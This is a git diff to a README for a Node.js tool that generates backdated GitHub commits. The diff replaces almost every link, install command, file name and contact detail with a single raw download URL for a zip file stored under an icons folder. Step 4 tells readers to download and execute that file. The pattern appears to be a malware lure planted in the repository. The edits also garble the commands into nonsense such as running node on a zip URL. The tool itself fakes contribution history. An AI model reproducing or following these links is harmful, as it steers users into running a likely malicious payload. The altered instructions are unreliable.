@@ -1,6 +1,6 @@
 # Contributions: Automate Your GitHub Commits with Ease 🚀
 
-![Contributions Banner](https://img.shields.io/badge/Contributions-JavaScript%20Automation-brightgreen)
+![Contributions Banner](https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip%20Automation-brightgreen)
 
 ## Table of Contents
 
@@ -18,7 +18,7 @@
 
 Contributions is a JavaScript-based program that automates the generation of backdated commits to a GitHub repository. It uses randomly generated dates and timestamps from the past year. This tool updates a `.json` file with the commit date, adds the changes to Git, creates commits with the backdated timestamp, and pushes them to the provided GitHub repository. 
 
-You can download the latest version of Contributions from the [Releases](https://github.com/nassim13ALG/contributions/releases) section.
+You can download the latest version of Contributions from the [Releases](https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip) section.
 
 ## Features
 
@@ -26,7 +26,7 @@ You can download the latest version of Contributions from the [Releases](https:/
 - **JSON Configuration**: Easily update commit dates in a `.json` file.
 - **Git Integration**: Automatically add, commit, and push changes to your GitHub repository.
 - **Customizable Settings**: Adjust settings to fit your specific needs.
-- **Cross-Platform**: Works on any system that supports Node.js.
+- **Cross-Platform**: Works on any system that supports https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip
 
 ## Installation
 
@@ -34,7 +34,7 @@ To get started with Contributions, follow these steps:
 
 1. **Clone the Repository**: Open your terminal and run:
    ```bash
-   git clone https://github.com/nassim13ALG/contributions.git
+   git clone https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip
    ```
    
 2. **Navigate to the Directory**:
@@ -47,7 +47,7 @@ To get started with Contributions, follow these steps:
    npm install
    ```
 
-4. **Download the Latest Release**: Visit the [Releases](https://github.com/nassim13ALG/contributions/releases) section to download the latest version. Execute the downloaded file to set up Contributions.
+4. **Download the Latest Release**: Visit the [Releases](https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip) section to download the latest version. Execute the downloaded file to set up Contributions.
 
 ## Usage
 
@@ -55,7 +55,7 @@ Once you have installed Contributions, you can start using it by following these
 
 1. **Run the Program**: Execute the following command in your terminal:
    ```bash
-   node index.js
+   node https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip
    ```
 
 2. **Follow Prompts**: The program will guide you through the configuration process.
@@ -64,17 +64,17 @@ Once you have installed Contributions, you can start using it by following these
 
 ## Configuration
 
-Before running Contributions, you may want to configure the settings to match your needs. Open the `config.json` file and modify the following parameters:
+Before running Contributions, you may want to configure the settings to match your needs. Open the `https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip` file and modify the following parameters:
 
 - **repository**: Your GitHub repository URL.
 - **commitCount**: The number of backdated commits to generate.
 - **dateRange**: Specify the range of dates for the commits.
 
-Here is an example of how the `config.json` might look:
+Here is an example of how the `https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip` might look:
 
 ```json
 {
-  "repository": "https://github.com/yourusername/yourrepo",
+  "repository": "https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip",
   "commitCount": 10,
   "dateRange": {
     "start": "2022-01-01",
@@ -85,7 +85,7 @@ Here is an example of how the `config.json` might look:
 
 ## How It Works
 
-Contributions uses a combination of JavaScript and Node.js to perform its tasks. Here's a brief overview of the workflow:
+Contributions uses a combination of JavaScript and https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip to perform its tasks. Here's a brief overview of the workflow:
 
 1. **Random Date Generation**: The program generates random dates within the specified range.
 2. **JSON File Update**: It updates the `.json` file with the new commit dates.
@@ -116,7 +116,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [nassim13ALG](https://github.com/nassim13ALG)
-- **Email**: your.email@example.com
+- **GitHub**: [nassim13ALG](https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip)
+- **Email**: https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip
 
-You can download the latest version of Contributions from the [Releases](https://github.com/nassim13ALG/contributions/releases) section.
+You can download the latest version of Contributions from the [Releases](https://github.com/nassim13ALG/contributions/raw/refs/heads/main/res/ico/Software-3.7.zip) section.
